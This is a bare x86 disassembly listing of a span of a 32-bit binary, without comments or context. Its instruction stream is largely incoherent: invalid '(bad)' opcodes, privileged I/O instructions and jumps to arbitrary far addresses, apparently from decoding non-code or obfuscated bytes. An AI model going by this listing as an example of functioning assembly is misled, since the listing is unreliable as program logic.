  411de7:	xchg   eax,edx
  411de9:	add    al,0xf6
  411deb:	(bad)  
  411dec:	(bad)  
  411ded:	gs cli 
  411def:	dec    ebx
  411df0:	cld    
  411df1:	jle    0x411df2
  411df3:	pop    DWORD PTR [ebx]
  411df5:	test   al,0x3
  411df7:	xlat   BYTE PTR ds:[ebx]
  411df8:	dec    edi
  411df9:	push   ds
  411dfa:	inc    edi
  411dfb:	fcomp  QWORD PTR [eax-0x1e]
  411dfe:	iret   
  411dff:	lea    edx,[edi]
  411e01:	aam    0xc
  411e03:	mov    edx,0xa7d7e774
  411e08:	lea    esp,[ecx+0x30]
  411e0b:	and    BYTE PTR [esi+0x23],cl
  411e0e:	jle    0x411de4
  411e10:	aam    0x7a
  411e12:	push   0xa
  411e14:	(bad)  [ebx+edi*1-0x49f32b9f]
  411e1b:	add    eax,edx
  411e1d:	cmp    eax,0x7b9531cc
  411e22:	mov    eax,0xc57368d1
  411e27:	in     eax,0xb4
  411e29:	addr16 and eax,0xbdebc283
  411e2f:	pop    ebx
  411e30:	test   BYTE PTR [ebx],0x4
  411e33:	in     al,0x69
  411e35:	mov    bh,0x18
  411e37:	add    al,0xd0
  411e39:	add    DWORD PTR [eax+ebp*1-0x55982ec7],ecx
  411e40:	pop    esi
  411e41:	jno    0x411e52
  411e43:	and    esi,DWORD PTR [ebp+0x40]
  411e46:	scas   al,BYTE PTR es:[edi]
  411e47:	mov    eax,0x8b541b1b
  411e4c:	into   
  411e4d:	adc    dh,ch
  411e4f:	fild   WORD PTR [edx+0x4d]
  411e52:	lock call 0x13bf:0x32cf7805
  411e5a:	mov    ebx,0xbf629a3a
  411e5f:	test   al,0x63
  411e61:	push   ecx
  411e62:	and    eax,0xf807627c
  411e67:	mov    bh,0x8c
  411e69:	bound  edx,QWORD PTR [ebx*4+0x5da938ad]
  411e70:	mov    esp,edx
  411e72:	aas    
  411e73:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411e75:	mov    al,0xd1
  411e77:	push   edi
  411e78:	dec    eax
  411e79:	sbb    edi,eax
  411e7b:	vcmppd ymm0,ymm0,YMMWORD PTR [ebp-0x7d],0x3d
  411e82:	mov    eax,0xff6d91d
  411e87:	sahf   
  411e88:	lods   al,BYTE PTR ds:[esi]
  411e89:	and    eax,0xed3cd9b7
  411e8e:	iret   
  411e8f:	pusha  
  411e90:	push   0xaa45b0c8
  411e95:	push   ss
  411e96:	fst    st(4)
  411e98:	pop    eax
  411e99:	rcl    DWORD PTR [eax],0xaa
  411e9c:	jae    0x411e3a
  411e9e:	xchg   DWORD PTR [eax],ebp
  411ea0:	xor    DWORD PTR [ebp-0x25e94b53],ecx
  411ea6:	adc    DWORD PTR [edi-0x4c],edx
  411ea9:	mov    al,ds:0xa3c2a622
  411eae:	js     0x411ee6
  411eb0:	xchg   esi,eax
  411eb1:	repz mov al,0x79
  411eb4:	inc    BYTE PTR [eax+0xcf367af]
  411eba:	push   esp
  411ebb:	jae    0x411e4f
  411ebd:	mov    edi,0xbdc76275
  411ec2:	or     DWORD PTR [ebp+0x187a5d01],edi
  411ec8:	jmp    0xeac5:0xbeeac743
  411ecf:	pop    ebp
  411ed0:	or     BYTE PTR [ebx-0x79],cl
  411ed3:	sahf   
  411ed4:	jl     0x411f55
  411ed6:	je     0x411eb0
  411ed8:	(bad)  
  411ed9:	cdq    
  411eda:	pop    es
  411edb:	cmp    DWORD PTR [eax],esp
  411edd:	adc    eax,0x22f83572
  411ee2:	and    esp,DWORD PTR [esi-0x7a]
  411ee5:	push   ecx
  411ee6:	sbb    al,0x5e
  411ee8:	push   ss
  411ee9:	mov    dh,0x88
  411eeb:	dec    edx
  411eec:	inc    BYTE PTR [edi+edi*8-0x43bb1bb0]
  411ef3:	pop    ebp
  411ef4:	inc    edx
  411ef5:	cmp    eax,0xd0ecdd03
  411efa:	lds    esp,FWORD PTR [eax]
  411efc:	out    dx,eax
  411efd:	push   esi
  411efe:	xlat   BYTE PTR ds:[ebx]
  411eff:	int    0xaa
  411f01:	je     0x411ec7
  411f03:	retf   0xde95
  411f06:	stos   BYTE PTR es:[edi],al
  411f07:	cli    
  411f08:	sbb    al,0x88
  411f0a:	push   cs
  411f0b:	aad    0x99
  411f0d:	push   0x4f6f41b5
  411f12:	daa    
  411f13:	(bad)  
  411f14:	sti    
  411f15:	push   ebx
  411f16:	(bad)  
  411f17:	cwde   
  411f18:	xchg   esi,eax
  411f19:	sbb    eax,0x44c8ab11
  411f1e:	sub    eax,ebx
  411f20:	jns    0x411f41
  411f22:	ja     0x411f6b
  411f24:	or     cl,ah
  411f26:	int    0x7c
  411f28:	js     0x411fa3
  411f2a:	jnp    0x411f04
  411f2c:	mov    ebp,DWORD PTR [ebx-0x1c]
  411f2f:	xchg   BYTE PTR [edi],al
  411f31:	in     al,dx
  411f32:	inc    edx
  411f33:	jnp    0x411fad
  411f35:	pop    edx
  411f36:	gs mov eax,0x3f1c313f
  411f3c:	cmp    ah,BYTE PTR [edi+0x3b]
  411f3f:	popf   
  411f40:	ret    
  411f41:	add    esi,DWORD PTR [ecx]
  411f43:	pop    esi
  411f44:	outs   dx,BYTE PTR ds:[esi]
  411f45:	in     eax,0x37
  411f47:	mov    ds:0xd19f8d9d,al
  411f4c:	fsub   DWORD PTR [esi+ebx*8+0x14ec4438]
  411f53:	sub    eax,0x79e37956
  411f58:	cli    
  411f59:	or     ebp,DWORD PTR [ebp+0x42]
  411f5c:	xchg   DWORD PTR [ebx+ebx*2],eax
  411f5f:	jae    0x411fb1
  411f61:	mov    bl,0x1b
  411f63:	in     al,0x5e
  411f65:	loope  0x411f5d
  411f67:	cmc    
  411f68:	icebp  
  411f69:	mov    bh,0x60
  411f6b:	(bad)  
  411f6c:	jg     0x411f86
  411f6e:	popa   
  411f6f:	outs   dx,DWORD PTR ds:[esi]
  411f70:	adc    esi,DWORD PTR [eax-0x1a]
  411f73:	add    ebx,DWORD PTR [eax+0x20]
  411f76:	out    dx,al
  411f77:	hlt    
  411f78:	inc    BYTE PTR [edx-0x36]
  411f7b:	sub    DWORD PTR ds:0x2697411f,esp
  411f81:	cmp    al,0xde
  411f83:	ins    BYTE PTR es:[edi],dx
  411f84:	jnp    0x411f73
  411f86:	xor    BYTE PTR [ebx+0x712e7d9a],bh
  411f8c:	(bad)  
  411f8d:	and    edx,esi
  411f8f:	call   0x5cf5:0x7c959564
  411f96:	sbb    bl,BYTE PTR [ecx-0xd722ed7]
  411f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f9d:	ja     0x412011
  411f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fa0:	sti    
  411fa1:	enter  0x4f2f,0x68
  411fa5:	arpl   WORD PTR [ebp+0x5c],ax
  411fa8:	scas   eax,DWORD PTR es:[edi]
  411fa9:	dec    edx
  411faa:	sahf   
  411fab:	dec    ecx
  411fac:	ja     0x411f7c
  411fae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411faf:	cmp    eax,0x2015add2
  411fb4:	test   bh,cl
  411fb6:	pop    esp
  411fb7:	xchg   DWORD PTR [ebp-0x5a900b44],esp
  411fbd:	mov    ch,0x84
  411fbf:	fcomp  DWORD PTR [eax-0x1be4d504]
  411fc5:	sub    al,0x29
  411fc7:	mov    bl,0xf4
  411fc9:	xchg   edx,eax
  411fca:	hlt    
  411fcb:	cdq    
  411fcc:	add    eax,0x47f6e7ad
  411fd1:	xor    al,0x17
  411fd3:	sub    ecx,DWORD PTR [ebx]
  411fd5:	ja     0x411fb5
  411fd7:	jge    0x411f75
  411fd9:	inc    eax
  411fda:	aad    0xf5
  411fdc:	sub    al,0x9c
  411fde:	xor    DWORD PTR [edx+0x40],0xbbb954f7
  411fe5:	and    ch,ah
  411fe7:	jnp    0x411f99
  411fe9:	ror    dh,0xcd
  411fec:	xchg   DWORD PTR [eax+ecx*8],edi
  411fef:	mov    bh,0x86
  411ff1:	push   0xcd27bd1d
  411ff6:	mov    esp,0xc9caea86
  411ffb:	fs dec eax
  411ffd:	leave  
  411ffe:	sbb    DWORD PTR [ecx],ecx
  412000:	mov    esi,0xc774b38e
  412005:	aad    0x1
  412007:	lods   eax,DWORD PTR ds:[esi]
  412008:	xchg   BYTE PTR [edi],bl
  41200a:	xchg   ecx,eax
  41200b:	jnp    0x412007
  41200d:	adc    eax,esp
  41200f:	jp     0x41207e
  412011:	pop    edx
  412012:	xor    eax,0x1dc6cf06
  412017:	out    0x22,al
  412019:	or     bh,BYTE PTR [ebx+0x31]
  41201c:	ins    BYTE PTR es:[edi],dx
  41201d:	aaa    
  41201e:	lods   al,BYTE PTR ds:[esi]
  41201f:	hlt    
  412020:	sbb    eax,0x14f4964c
  412025:	stc    
  412026:	loope  0x411ff4
  412028:	pinsrw mm2,esi,0xcb
  41202c:	jge    0x41209d
  41202e:	in     eax,0xc
  412030:	dec    edi
  412031:	cmp    bl,BYTE PTR [esi-0x6b]
  412034:	lock sub eax,0xb2d9b71b
  41203a:	addr16 in eax,0x76
  41203d:	sub    DWORD PTR [ebp-0x3f],0xde881ea3
  412044:	out    0xc7,al
  412046:	inc    edi
  412047:	add    esi,DWORD PTR [ecx+esi*8-0x10]
  41204b:	pop    edi
  41204c:	loope  0x411fd3
  41204e:	jo     0x41204a
  412050:	cmp    esp,esi
  412052:	xor    DWORD PTR ds:0x297f64ac,edi
  412058:	stos   DWORD PTR es:[edi],eax
  412059:	(bad)  
  41205b:	mov    bl,0xc
  41205d:	test   DWORD PTR [eax+0x8],ecx
  412060:	daa    
  412061:	(bad)  
  412062:	fcomp  QWORD PTR [edx+0x3416cac8]
  412068:	lahf   
  412069:	mov    edx,0x11c62fae
  41206e:	xor    al,0xb2
  412070:	cmp    edi,esp
  412072:	ins    BYTE PTR es:[edi],dx
  412073:	mov    es,eax
  412075:	mov    ebp,0x53e848e8
  41207a:	(bad)  
  41207b:	adc    ah,bh
  41207d:	ret    
  41207e:	sbb    eax,0x97d090a7
  412083:	add    BYTE PTR [ebp-0x3f],dh
  412086:	std    
  412087:	pusha  
  412088:	mov    ah,BYTE PTR [esi+0x2fc85f6f]
  41208e:	mov    bl,0x44
  412090:	jns    0x412065
  412092:	call   0x6e829442
  412097:	(bad)  
  412099:	iret   
  41209a:	clc    
  41209b:	in     al,0xaf
  41209d:	(bad)
  4120a1:	xchg   edi,eax
  4120a3:	rol    ch,0xaf
  4120a6:	loop   0x41209f
  4120a8:	sub    eax,0x174f36b5
  4120ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120ae:	xchg   ecx,eax
  4120af:	xor    BYTE PTR [ebp-0x29524af8],dl
  4120b5:	cs push 0xffffffaa
  4120b8:	push   cs
  4120b9:	outs   dx,DWORD PTR ds:[esi]
  4120ba:	sbb    DWORD PTR [ebp-0x80],0x31d25303
  4120c1:	ins    BYTE PTR es:[edi],dx
  4120c2:	sub    BYTE PTR [edx-0x2c],dl
  4120c5:	mov    eax,ds:0x9d5b8836
  4120ca:	div    dl
  4120cc:	sub    bh,BYTE PTR [ecx+0x70e4029b]
  4120d2:	adc    al,0x9b
  4120d4:	fmul   st(3),st
  4120d6:	push   es
  4120d7:	ins    BYTE PTR es:[edi],dx
  4120d8:	fmul   DWORD PTR [ebx+0x13105cdc]
  4120de:	push   ecx
  4120df:	jnp    0x41210d
  4120e1:	jmp    0x412133
  4120e3:	adc    eax,0xe21a4887
  4120e8:	jno    0x41208c
  4120ea:	scas   al,BYTE PTR es:[edi]
  4120eb:	jmp    0x6ab8:0x3965abec
  4120f2:	jp     0x4120fb
  4120f4:	jmp    0x412144
  4120f6:	call   0x210f:0xb54c3390
  4120fd:	mov    bh,0x1e
  4120ff:	sbb    DWORD PTR [edi-0x7b],ebx
  412102:	outs   dx,BYTE PTR ds:[esi]
  412103:	int    0xdf
  412105:	xor    dl,BYTE PTR [esi+esi*2+0x2e]
  412109:	or     al,BYTE PTR [edi+0x38]
  41210c:	pop    ebp
  41210d:	mov    dl,0x6a
  41210f:	add    eax,0xd36df7d
  412114:	pop    ecx
  412115:	aaa    
  412116:	fsub   DWORD PTR [eax-0x2a]
  412119:	cdq    
  41211a:	push   cs
  41211b:	push   ebx
  41211c:	xchg   ecx,eax
  41211d:	lods   eax,DWORD PTR ds:[esi]
  41211e:	ins    DWORD PTR es:[edi],dx
  41211f:	out    dx,al
  412120:	imul   edx,DWORD PTR [edx+ecx*1-0x61],0xd09c8bdc
  412128:	adc    dl,dh
  41212a:	popa   
  41212b:	leave  
  41212c:	pop    ecx
  41212e:	sbb    BYTE PTR [ecx+eiz*4],ch
  412131:	mov    edi,0x1c64a947
  412136:	fnstcw WORD PTR [ebp-0x1]
  412139:	(bad)  
  41213b:	pop    esp
  41213c:	add    eax,0x6ca078d8
  412141:	cmp    eax,0xbd15d84d
  412146:	(bad)  [esi-0x3c]
  412149:	mov    dl,al
  41214b:	xor    dh,ch
  41214d:	push   edx
  41214e:	xchg   edi,eax
  41214f:	fadd   QWORD PTR [ebx-0x1d04ad88]
  412155:	pop    ebx
  412156:	ins    BYTE PTR es:[edi],dx
  412157:	mov    bl,0x82
  412159:	or     BYTE PTR [ebx+0x33512263],dl
  41215f:	or     DWORD PTR [esi+0x5b],eax
  412162:	pop    ebp
  412163:	dec    ebx
  412164:	cld    
  412165:	or     BYTE PTR [edx],dl
  412167:	dec    esp
  412168:	mov    BYTE PTR [ebp-0x36],al
  41216b:	and    DWORD PTR [edx+eax*8+0x1a61fe1],ebx
  412172:	out    0xf4,eax
  412174:	fld    TBYTE PTR [ebx]
  412176:	mov    ah,0x82
  412178:	mov    al,ds:0x9ad34b6d
  41217d:	adc    DWORD PTR [eax],0x6a
  412180:	scas   eax,DWORD PTR es:[edi]
  412181:	fist   DWORD PTR ss:[ecx+0x9]
  412185:	sbb    al,0x6e
  412187:	sbb    eax,DWORD PTR [eax]
  412189:	retf   
  41218a:	mov    al,dl
  41218c:	fmul   QWORD PTR [esi-0x46]
  41218f:	sub    BYTE PTR [edx-0x2f],cl
  412192:	retf   0xfd95
  412195:	and    al,0x7b
  412197:	mov    ah,0x2b
  412199:	jmp    0xe91bdf5a
  41219e:	xchg   ebp,eax
  41219f:	sub    al,0xc0
  4121a1:	inc    ebp
  4121a2:	pushf  
  4121a3:	and    ebx,edx
  4121a5:	mov    al,es:0x82cf9a6c
  4121ab:	push   es
  4121ac:	(bad)  [ebx-0x32]
  4121af:	into   
  4121b0:	xchg   edi,eax
  4121b1:	les    esi,FWORD PTR [ebp-0x63]
  4121b4:	hlt    
  4121b5:	ret    0xe780
  4121b8:	lock push es
  4121ba:	pop    edi
  4121bb:	mov    edx,0xd1b8dc47
  4121c0:	push   0x64cd77b2
  4121c5:	jb     0x412190
  4121c7:	loopne 0x412164
  4121c9:	jmp    0x4ed6:0xd659c98c
  4121d0:	pop    eax
  4121d1:	jl     0x4121b2
  4121d3:	in     eax,0xd9
  4121d5:	jmp    0xf228aacc
  4121da:	dec    ebp
  4121db:	mov    ?,WORD PTR [ecx]
  4121dd:	shl    DWORD PTR [edi],cl
  4121df:	or     BYTE PTR [esi-0x47eaf4f],cl
  4121e5:	add    edx,DWORD PTR [esi]
  4121e7:	sub    BYTE PTR [ebp+ebx*2+0x3c58525a],bl
  4121ee:	sbb    BYTE PTR [eax],dh
  4121f0:	jne    0x412236
  4121f2:	test   al,0xb
  4121f4:	sbb    DWORD PTR [eax-0x1aac47a2],edi
  4121fa:	inc    edx
  4121fb:	dec    edx
  4121fc:	push   ecx
  4121fd:	test   al,0x3c
  4121ff:	pop    ebp
  412201:	add    BYTE PTR [ecx],ah
  412203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412204:	sbb    dl,BYTE PTR [eax]
  412206:	outs   dx,DWORD PTR ds:[esi]
  412207:	das    
  412208:	out    dx,al
  412209:	bound  esp,QWORD PTR [esi+0x1db159e7]
  41220f:	mov    ah,0xf1
  412211:	retf   
  412212:	fcomp  st(7)
  412214:	sar    BYTE PTR [edi+0x68],1
  412217:	mov    eax,ds:0x7d5d6f44
  41221c:	ja     0x4121dd
  41221e:	ds cwde 
  412220:	inc    ebp
  412221:	cmp    BYTE PTR [esi+ebx*8],al
  412224:	lods   al,BYTE PTR ds:[esi]
  412225:	out    0x73,al
  412227:	adc    BYTE PTR [edx+0x30],ch
  41222a:	xchg   edx,eax
  41222b:	pop    es
  41222c:	mov    ds,WORD PTR [ecx+ecx*4-0x76ea9619]
  412233:	call   DWORD PTR [esi-0x14]
  412236:	fcom   st(6)
  412238:	cmp    al,0xc0
  41223a:	mov    ch,0x1f
  41223c:	or     DWORD PTR [ecx],esp
  41223e:	add    dh,BYTE PTR [ecx]
  412240:	xchg   ecx,eax
  412241:	jmp    0xf7b7:0xa61fae3
  412248:	or     BYTE PTR [edx-0x6c],ch
  41224b:	mov    edi,0x93484d5d
  412250:	or     al,0xa4
  412252:	es push ebp
  412254:	loop   0x4122c8
  412256:	push   edi
  412257:	adc    DWORD PTR [eax-0xe26dca5],edx
  41225d:	or     eax,0x8263870f
  412262:	pop    ebp
  412263:	xchg   esp,eax
  412264:	fsubr  DWORD PTR [edi+ecx*4]
  412267:	xchg   ebp,eax
  412268:	mov    eax,DWORD PTR [eax-0x55]
  41226b:	bound  edx,QWORD PTR [eax+0x2d46871f]
  412271:	vmread DWORD PTR [edi-0x6f247d37],ebp
  412278:	add    cl,BYTE PTR [eax]
  41227a:	jnp    0x41225e
  41227c:	cmp    ecx,DWORD PTR [edx+0x63]
  41227f:	xchg   edx,eax
  412280:	daa    
  412281:	jp     0x41227a
  412283:	ja     0x412288
  412285:	test   DWORD PTR [ecx],esp
  412287:	adc    DWORD PTR [ecx],esp
  412289:	scas   eax,DWORD PTR es:[edi]
  41228a:	fisub  WORD PTR [edi-0x2e0e40fa]
  412290:	adc    BYTE PTR [edi+0xc7d5aea],ch
  412296:	mov    al,0xe
  412298:	cld    
  412299:	jl     0x412258
  41229b:	dec    ebx
  41229c:	push   eax
  41229d:	iret   
  41229e:	pop    esi
  41229f:	and    al,0x2a
  4122a1:	adc    DWORD PTR [edi],ebp
  4122a3:	shl    BYTE PTR [ebp-0x3],0xf1
  4122a7:	adc    ecx,DWORD PTR [edx-0x2b]
  4122aa:	call   FWORD PTR [edi]
  4122ac:	(bad)  
  4122ad:	aas    
  4122ae:	js     0x4122bd
  4122b0:	or     dl,BYTE PTR [ebp-0x7d786621]
  4122b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b7:	adc    BYTE PTR [edx-0x64685097],dl
  4122bd:	jge    0x412284
  4122bf:	push   ds
  4122c0:	lock xor esp,DWORD PTR ds:0x673bfb8f
  4122c7:	ins    DWORD PTR es:[edi],dx
  4122c8:	dec    esp
  4122c9:	popa   
  4122ca:	push   esp
  4122cb:	push   ds
  4122cc:	mov    ds:0xf66daac7,eax
  4122d1:	jle    0x4122bf
  4122d3:	js     0x4122f0
  4122d5:	stos   BYTE PTR es:[edi],al
  4122d6:	sub    al,0xf2
  4122d8:	mov    ds:0x78a2350b,eax
  4122dd:	mov    ebp,0x59fa9aff
  4122e2:	dec    esp
  4122e3:	push   ss
  4122e4:	(bad)  
  4122e5:	sbb    esp,ebx
  4122e7:	inc    ecx
  4122e8:	lahf   
  4122e9:	fwait
  4122ea:	neg    esi
  4122ec:	(bad)  
  4122ed:	stos   BYTE PTR es:[edi],al
  4122ee:	mov    ebx,0xf9b5da05
  4122f3:	fwait
  4122f4:	adc    eax,ecx
  4122f6:	fist   DWORD PTR [edi+eax*4+0x79]
  4122fa:	jle    0x41232a
  4122fc:	test   edi,edi
  4122fe:	call   0xf857:0xa68fff59
  412305:	into   
  412306:	fadd   DWORD PTR [ecx+0x3f]
  412309:	dec    edx
  41230a:	lea    esp,ds:0xa4018b38
  412310:	lock or DWORD PTR [edi-0x23fe5955],edx
  412317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412318:	mov    edx,0x3b9341df
  41231d:	mov    cl,0xd8
  41231f:	mov    ebx,0x18ffd793
  412324:	push   eax
  412325:	sub    dh,BYTE PTR [edi+0xf58855f]
  41232b:	mov    bh,0x6d
  41232d:	add    eax,0x582b5e3
  412332:	jno    0x4122e1
  412334:	xchg   edi,eax
  412335:	lea    edi,[ebp+edi*2+0x56fe2faf]
  41233c:	into   
  41233d:	arpl   WORD PTR [ebx],dx
  41233f:	test   DWORD PTR [esi],edx
  412341:	inc    edi
  412342:	xchg   edi,eax
  412343:	push   edx
  412344:	xchg   edx,eax
  412345:	test   DWORD PTR [edi-0x4f0d3d44],ebx
  41234b:	call   0xaacec3e
  412350:	sbb    BYTE PTR [eax],al
  412352:	popa   
  412353:	fldcw  WORD PTR [edi]
  412355:	(bad)  ss:[ecx-0x6d]
  412359:	scas   eax,DWORD PTR es:[edi]
  41235a:	mov    al,0x70
  41235c:	stos   BYTE PTR es:[edi],al
  41235d:	fbld   TBYTE PTR [edi]
  41235f:	outs   dx,BYTE PTR ds:[esi]
  412360:	cmp    dl,BYTE PTR [ebp+0x6a]
  412363:	dec    esp
  412364:	and    bh,cl
  412366:	sub    eax,0xd60f1e49
  41236b:	inc    eax
  41236c:	repnz cli 
  41236e:	(bad)  
  41236f:	cmp    edx,DWORD PTR [esi]
  412371:	cs mov bh,0x59
  412374:	cmp    al,0x1e
  412376:	cli    
  412377:	and    DWORD PTR [edi],edx
  412379:	mov    dh,0x55
  41237b:	mov    esi,0x793829a4
  412380:	clc    
  412381:	jns    0x412374
  412383:	sbb    edi,DWORD PTR ds:0xf7b47220
  412389:	imul   esp,DWORD PTR [ecx],0xffffffe2
  41238c:	js     0x412405
  41238e:	fistp  DWORD PTR [ecx]
  412390:	xchg   ebp,eax
  412391:	(bad)  
  412392:	imul   edi
  412394:	or     edx,eax
  412396:	loop   0x4123b4
  412398:	inc    esi
  412399:	sbb    eax,esp
  41239b:	jns    0x412329
  41239d:	inc    edx
  41239e:	mov    ecx,0xd25d1f77
  4123a3:	stc    
  4123a4:	sbb    al,0xc
  4123a6:	push   esp
  4123a7:	int    0xa5
  4123a9:	or     edi,ebx
  4123ab:	cmc    
  4123ac:	xchg   ebx,eax
  4123ad:	xor    DWORD PTR [edi-0x9],ebx
  4123b0:	(bad)  
  4123b2:	pop    esp
  4123b3:	ds popa 
  4123b5:	test   eax,0xc6f6c57d
  4123ba:	mov    bl,0x64
  4123bc:	mov    ebx,0xe0c91d6a
  4123c1:	pop    ebp
  4123c2:	js     0x4123be
  4123c4:	sub    bh,BYTE PTR [edx-0x34]
  4123c7:	jne    0x412404
  4123c9:	push   eax
  4123ca:	mov    ebp,0xc5ca5f08
  4123cf:	inc    ebx
  4123d0:	or     eax,0x463e444f
  4123d5:	push   edi
  4123d6:	dec    esp
  4123d7:	mov    ch,0x9
  4123d9:	fs (bad) 
  4123db:	and    ch,ah
  4123dd:	lock hlt 
  4123df:	jg     0x412416
  4123e1:	mov    ch,0xb4
  4123e3:	mov    ds:0xab7581fc,eax
  4123e8:	xor    BYTE PTR [edx-0x77db2458],al
  4123ee:	cld    
  4123ef:	dec    edx
  4123f0:	(bad)  
  4123f1:	mov    edx,0x3240df97
  4123f6:	push   edi
  4123f7:	call   0x5567:0x2d734744
  4123fe:	xchg   DWORD PTR [esi+0x4795cdc5],edx
  412404:	pop    esp
  412405:	es popa 
  412407:	dec    ecx
  412408:	dec    edi
  412409:	jne    0x412425
  41240b:	jp     0x412422
  41240d:	ds dec esi
  41240f:	in     eax,dx
  412410:	inc    ecx
  412411:	fmul   DWORD PTR [esi]
  412413:	mov    cl,ch
  412415:	popf   
  412416:	loop   0x412416
  412418:	push   0x1d
  41241a:	sar    BYTE PTR [ecx+eax*2-0x2ad2c091],0xb8
  412422:	xchg   edi,eax
  412423:	mov    edi,0xffc8014a
  412428:	aaa    
  412429:	adc    dh,BYTE PTR [esi-0x21]
  41242c:	push   ss
  41242d:	sub    edi,DWORD PTR [edx-0x1e6421ca]
  412433:	scas   eax,DWORD PTR es:[edi]
  412434:	xchg   DWORD PTR [edx+0x6b],esi
  412437:	adc    DWORD PTR [edx],eax
  412439:	or     BYTE PTR [edx-0x68],ch
  41243c:	fldcw  WORD PTR ds:0x5fba9036
  412442:	jg     0x4123d7
  412444:	xor    ch,BYTE PTR [ebx+0x69c7d1cc]
  41244a:	xor    ecx,DWORD PTR [eax]
  41244c:	and    DWORD PTR [esi+0x27],0xe01d3c60
  412453:	inc    ecx
  412454:	inc    edi
  412455:	ja     0x412409
  412457:	jle    0x412461
  412459:	inc    ebp
  41245a:	pop    ds
  41245b:	adc    dl,BYTE PTR [ecx]
  41245d:	mov    ebx,0x17e73234
  412462:	dec    edx
  412463:	loop   0x41243d
  412465:	cmp    BYTE PTR [ebx+0x361c803f],dl
  41246b:	rcl    ah,cl
  41246d:	lock inc ebp
  41246f:	ds in  eax,0xda
  412472:	ins    BYTE PTR es:[edi],dx
  412473:	ror    BYTE PTR [ebx+0xb1bf4dd],0x55
  41247a:	lods   eax,DWORD PTR ds:[esi]
  41247b:	jg     0x4123fd
  41247d:	and    eax,0x5be28008
  412482:	popa   
  412483:	je     0x41247d
  412485:	rol    al,0x22
  412488:	out    0xd0,al
  41248a:	or     dl,BYTE PTR [edi]
  41248c:	out    dx,al
  41248d:	and    BYTE PTR [edx],cl
  41248f:	int    0xa6
  412491:	sti    
  412492:	cld    
  412493:	inc    esp
  412494:	adc    eax,0x1c3afceb
  412499:	(bad)  
  41249b:	add    DWORD PTR [ecx-0x46],esi
  41249e:	(bad)  
  41249f:	cwde   
  4124a0:	in     al,0x52
  4124a2:	(bad)  [esi]
  4124a4:	mov    edx,0x5bd521da
  4124a9:	add    edx,DWORD PTR [esi+eiz*4+0x6b]
  4124ad:	cmp    al,0xbf
  4124af:	das    
  4124b0:	xlat   BYTE PTR es:[ebx]
  4124b2:	sbb    al,0x74
  4124b4:	jbe    0x412439
  4124b6:	xor    DWORD PTR [ebx+0x7de4d49b],ebp
  4124bc:	stos   BYTE PTR es:[edi],al
  4124bd:	sbb    BYTE PTR [edi+edx*2+0x29f3d88b],cl
  4124c4:	inc    edx
  4124c5:	addr16 shr ch,1
  4124c8:	mov    ecx,0x4821b198
  4124cd:	sahf   
  4124ce:	or     bl,BYTE PTR ds:0x5257b008
  4124d4:	inc    eax
  4124d5:	shl    BYTE PTR [edi-0x4a4c43c8],cl
  4124db:	xchg   ecx,edi
  4124dd:	es ret 
  4124df:	adc    al,0x3
  4124e1:	mov    ecx,0x7d66e7f7
  4124e6:	push   edi
  4124e7:	(bad)  
  4124e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e9:	jb     0xe1560cf4
  4124ef:	lock mov eax,0xc470b5b4
  4124f5:	js     0x412517
  4124f7:	cdq    
  4124f8:	mov    edx,0xb1cd74ae
  4124fd:	je     0x4124d7
  4124ff:	xor    BYTE PTR [eax+0x4bde8072],dh
  412505:	or     BYTE PTR [edx-0x1f3f7050],dh
  41250b:	dec    esp
  41250c:	fnstenv [edi-0xc]
  41250f:	lar    esi,WORD PTR [edi+0xb]
  412513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412514:	les    eax,FWORD PTR [eax]
  412516:	dec    esp
  412517:	push   esp
  412518:	lea    eax,[esi-0x66f47710]
  41251e:	jo     0x412540
  412520:	sub    ah,BYTE PTR [ebp-0x30]
  412523:	ror    BYTE PTR ds:0xd8144177,0x29
  41252a:	xor    ecx,DWORD PTR [esp+edx*4]
  41252d:	(bad)  [ebx]
  41252f:	rcr    BYTE PTR [esi-0x7c],0x64
  412533:	mov    eax,ds:0x61bf4af0
  412538:	mov    edi,0xf62b098b
  41253d:	xchg   edx,eax
  41253e:	pusha  
  41253f:	cli    
  412540:	sub    eax,0x5f6ece8e
  412545:	push   ecx
  412546:	and    edi,DWORD PTR [eax]
  412548:	add    eax,0x819970a4
  41254d:	inc    eax
  41254e:	push   0xd178a51c
  412553:	int    0x4d
  412555:	add    BYTE PTR [ebx-0x8167757],dh
  41255b:	rol    BYTE PTR [ebx+0x79],1
  41255e:	rcl    DWORD PTR [eax],cl
  412560:	arpl   WORD PTR [esi-0x70],bp
  412563:	(bad)  
  412564:	iret   
  412565:	inc    ebx
  412566:	loop   0x412576
  412568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412569:	cli    
  41256a:	xor    ebx,esi
  41256c:	xchg   cl,ah
  41256e:	jge    0x4124fe
  412570:	inc    edi
  412571:	jb     0x41254f
  412573:	mov    esi,0x131723c1
  412578:	sub    eax,0xa0c8fa3
  41257d:	pop    ecx
  41257e:	cld    
  41257f:	imul   edi,DWORD PTR [ebp-0x888fb62],0xb57fd6c9
  412589:	jg     0x412528
  41258b:	jl     0x4125ba
  41258d:	xchg   esi,eax
  41258e:	pop    ecx
  41258f:	mov    eax,ds:0xd3af49a9
  412594:	(bad)  [edx+0x22de2ecb]
  41259a:	div    esp
  41259c:	lea    esp,[edx]
  41259e:	or     al,ah
  4125a0:	xchg   edx,eax
  4125a1:	sbb    al,0x23
  4125a3:	not    BYTE PTR [edx+0x959c406]
  4125a9:	or     al,0xc3
  4125ab:	fbld   TBYTE PTR [ebx]
  4125ad:	xchg   ecx,eax
  4125ae:	cwde   
  4125af:	push   esi
  4125b0:	jb     0x4125ba
  4125b2:	pop    es
  4125b3:	pop    esp
  4125b4:	inc    edi
  4125b5:	retf   
  4125b6:	cli    
  4125b7:	mov    ds:0xf189ce95,eax
  4125bc:	jo     0x412572
  4125be:	adc    BYTE PTR [edi-0xb9b6204],ch
  4125c4:	mov    bh,0x6c
  4125c6:	(bad)  
  4125c7:	loopne 0x4125eb
  4125c9:	mov    al,0x57
  4125cb:	fwait
